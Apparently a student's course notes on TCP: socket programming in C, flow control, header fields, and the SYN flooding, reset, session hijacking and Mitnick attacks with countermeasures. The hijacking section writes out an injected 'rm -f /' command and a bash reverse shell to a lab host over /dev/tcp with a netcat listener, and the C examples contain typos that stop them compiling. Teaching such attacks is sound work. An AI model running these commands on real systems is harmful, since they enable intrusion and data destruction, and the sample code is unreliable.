
# Week 5 TCP Protocol

## Directory
- [Home](/README.md#table-of-contents)
- [Week 4 Firewall](/week4/README.md#Week-4-Firewall)
- **&rarr;[Week 5 TCP Protocol](/week5/README.md#Week-5-TCP-Protocol)**
- [Week 6 DNS](/week6/README.md#Week-6-DNS)


## 5.2 The TCP Protocol and Attacks on TCP

### The need for TCP

- UDP does not:
  - packet loss
  - preserve order

- TCP:
  - handle packet loss
  - preserves order

## 5.3 TCP Client/Server Programming

### TCP Client Program
```C
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

int main(){
  //Create socket
  int sockfd = socket(AF_INET,SOCK_STREAM,0);
  
  //Set the destination information
  struct sockaddr_in dest;
  memset(&dest, 0, sizeof(struct sockaddr_in));
  dest.sin_family = AF_INET;
  dest.sin_addr.s_add = inet_addr("10.0.2.17");
  dest.sin_port = htons(9090); // host to network (short, port is a short)

  // connect to the server
  connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr_in)); // establish connection!
  //

  //write data
  char *buffer1 = "Hello server\n";
  char *buffer2 = "Hello again!\n";
  write(sockfd, buffer1, strlen(buffer1));
  write(sockfd, buffer2, strlen(buffer2));

  return 0;
}
```

- UDP is a data gram
- TCP is a stream

### TCP Server Program
```C
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

int main(){
  int sockfd, newsockfd,
  struct sockaddr_in my addr, client_addr;
  char buffer[100];

  //create socket
  sockfd = socket(AF_INET,SOCK_STREAM,0);

  // set the destination information
  memset(&my_add,0,sizeof(struct sockaddr_in));
  my_addr.sin_family = AF_INET;
  my_addr.sin_port = htons(9090);

  //bind the socket to a port number
  bind(sockfd. (struct sockaddr *)&my_addr, sizeof(struct sockaddr_in)); //register with port
  //(client side OS dynamically assigns port)

  //listen for connections
  listen(sockfd, 5); // i am ready - this is a queue, application get stuff out of queue
  int client_len = sizeof(client_addr);
  newsockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);// block, wait, dequeue

  // read data
  memset(buffre, 0, sizeof(buffer));
  int len = read(newsockfd, buffer, 100);
  printf("received %d bytes: %s", len, buffer);

  return 0;
}
```

### Accepting multiple connections
```C
while (1) {
  newsockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
  if (fork()==0){//child process
    close(sockfd);
    //read data
    memset(buffer, 0, sizeof(buffer));
    int len = read(newsockfd, buffer, 100);
    printf("received  %d bytes. \n%s\n", len, buffer);

    close(newsockfd);
    return 0;
  } else { // parent process
    close(newsockfd);
  }

}
```
- after you `accept`
  - fork to create a new process
  - create a new socket
- old socket needs to be used to wait for data

## 5.4 TCP Protocol: Buffer and Data Stream

### TCP Protocl: Buffer and Data Stream
- 4 buffers for tcp
- machine 1
  - sender buffer
  - receiver buffer
- machine 2
  - sender buffer
  - receiver buffer

- stream (tcp)
  - tcp needs to put the data in the buffer
  - keep putting data into buffer
  - applicatoin does not make decision how to serve packets
    - tcp makes that decision
    - heuristics
      - time (200 ms typical)
      - mtu (maximum transmit unit)
        - defined by hardware!
        - what happens if you send more than mtu?

- data gram (UDP)
  - send one packet

- tcp mantains order
- receiving buffer receives indexed packet
  - receiver knows where to put them
  - sequence numbers
- once tcp receives all of the packets, tcp gives data to application when it wants
  - overhead on sending data immediately, interupts cpu
  - heuristics
  - tcp can receive out of order, but NEVER deliver out of order
    - please resend
    - if nework is broken, data will never be received and will terminate after a few tries

## 5.5 Flow and Congestion Control

### Flow Control and Sliding Window

- application (A)
- server (B)

- if B is much slower than A, buffer can fill up
  - buffer is not unlimited in size
  - if B's buffer is full, drop the packet
- A keep sending more data
  - B keeps dropping packet
- B needs to inform A how fast it is
  - how much data it can take in time

#### Flow Control

- sliding window
  - set up window in buffer A
  - in this window, send data as fast as possible
  - B will receive some data, and inform A
  - A slides the window by the size of the data B has informed that it received

- window size
  - large
    - too much data, buffer overflow
  - small
    - one at a time, slow

#### Congestion Control
- router can get congested, too!
  - router gets congested, drops packet
  - if A starts noticing a lot of dropped packets,
    - may be a router
    - adjust sliding window

## 5.6 TCP Header

### TCP Header
- Source port
- Destination port
- Sequence Number
  - sequence number of first octet
  - consecutive
- Acknowledgement number
  - `ACK` bit
- TCP Header length (multiply by 4)
- Window Size
  - flow control
- Checksum for integrity
- Urgent pointer
  - `URG` bit
  - ctrl-C
  - interrupt
  - tcp deliver to application through another emergent channel
    - application has to register channel
- bit fields
  - `URG`
  - `ACK`
  - `PSH`
    - immediately flush the buffer
  - `SYN`
  - `FIN`
  - `RST`

## 5.7 SYN Flooding Attacks
### Establishing Connections
TCP 3-way handshake
- tell each side what's my initial sequence number
- Client
  - client sends `SYN` (synchronize) packet to server
    - `SYN` specifies initial sequence number, `x`
  - client then sends `y+1` with `ACK`

- Server
  - Server is listening
  - Server `ACK` (acknowledge) after receiving `SYN`
    - `ACK` sends `x+1` to client
    - What is *server's* initial sequence number, `y`
  - Server `SYN`, `y` along with `ACK`, `x+1`

- Server recieves initial `SYN` , server opens half-open queue
  - Server sends `ACK`, deque
  - Queue takes recources

### SYN Flooding Attack

- Attacker floods the server with many many `SYN` packets
  - Attack with random IP
- Server replies with `ACK`
  - Attacker ignores response
  - Only have to fill up the queue memory

## 5.8 Countermeasures

### Countermeasures
- distributed denial of service
  - botnet

#### Counter measure
we want to make the power ballance symemetric. If you have to use a lot of resources to do an attack, you  might not want to attack.

- reduce time
  - fast network
- SYN Cookie
  - performance tradeoff
- Quiz approach
  - send quiz, if solve quiz sender is serious, not going to SYN flood

## 5.9 Exercise: TCP Reset Attacks

### Closing TCP Connections
How do we close a connection?
- A sends `FIN` to B
  - send `x` sequence number (not initial sequence number)
- B `ACK` `x+1` to A
- (A to B disconnected)
- B sends `FIN` to A
  - send `y` sequence number (not initial sequence number)
- A `ACK` `y+1` to B
- (B to A disconnected)

#### Another way to diconnect
- A `RST` to B
  - like hanging up the phone
  - emergency situations
- Why are you calling me?
  - use `RST`

### TCP Reset Attack
- A and B are talking to eachother nicely
- Attacker wants to break down the conncection.
- Attacker sends a spoofed `RST` packet
  - spoof src IP as B's IP to close connection with A

### Spoofing TCP Reset Packet
- what identifies a connection
  - Source IP Address
  - Destination IP Address
  - Source Port (:23)
  - Destination Port
  - Sequence number
  - `RST` bit

### Launch TCP Reset attack on existing connections
- telnet
- ssh
- streaming
  - packet `RST` should be sent to yourself
  - THIS IS SO YOU DON'T GET BLOCKED FROM YOUTUBE

## 5.10 Exercise: TCP Session Hijacking Attack

### TCP Session Hijacking Attack
- A telnet B
  - data: `ls -l`
- Attacker insert packet
  - data: `rm -f /`
    - remove everything from root directory :(
  - need to know
    - Source IP
    - Dest IP
    - Source IP
    - Dest Ip
    - Sequence number
- can just put the data somwhere in the buffer since the sequence number places it in the queue
  - put return character in data
    - &#9166; `rm -f /`

### What command to inject?
- We have hijacked the telnet connection
  - `rm -f /`
    - not very useful to attacker
  - run shell
    - `/bin/bash`

### Inject More Dangerous Commmand: Reverse Shell

- B runs shell, `/bin/bash/`
  - Attacker has control of shell
  - input device
    - file descriptor: 0
  - output device
    - file descriptor: 1,2
### Reverse Shell
- for the attacker to control the shell,
  - redirect input/output file descriptors to other machine
- TCP server
  - `nc -l 9090 -v`
  - whatever you receive is going to print out
  - whatever you send is going to 
  - redirect input/output to tcp server

#### reverse shell
- `2>&1` error to input
- `0<&1` input to output
`/bin/bash -i > /dev/tcp/10.0.2.7/9090 2>&1 0<&1`

## 5.11 The Mitnick Attack

### Mitnick Attack: Technical Details

- A
  - `rlogin`
- B
  - `rshosts`: allow A without login
- Mitnick attacker
  - send `SYN`,`ACK` to to B from A
  - B `ACK` to A
  - A doesn't expect `ACK`, so A sends `RST` to B to terminate connection
  - Mitnick launch denial of service on A
    - A cannot send `RST`
    - Mitnick `ACK` `y+1`
      - guess initial sequence number because it was predictable

## 5.12 Defending against TCP Attacks

### Defend against TCP Attacks
- Local
  - A and B are on the same network
  - easy to get necessary tcp headers
    - sniffing
- Remote
  - easy headers
    - source IP
    - dest IP
    - if telnet, dest port 23
  - harder headers
    - source port (can guess)
    - sequence number (can guess)

#### Countermeasure:
- randomize source port number
  - 16 bit number
- randomize initial sequence number
  - 32 bit number
- Encrypt the traffic!
  - `RST` attack is still succesful


## 5.13 Summary
- TCP Protocol
  - TCP vs UDP
  - TCP client/server programs
  - TCP Buffer
  - FLow control and congestion control
- Three-way handshake protocol and SYN flooding attack
- TCP reset attack
- TCP session hijacking attack
- Mitnick attack
- Countermeasures
  - encrypt data (use ssh)

# Week 6 & 7 Live Session
## Block cipher
- in symmetric key encryption
  - need strong encryption alogrithm
    - use aes most of the time
  - secrecy of the key

slide 2
what are the obvious reasons for doing the encryption in the hsm?
- what is hsm?

# Week 6 Live Session
## Approaches to message authentication
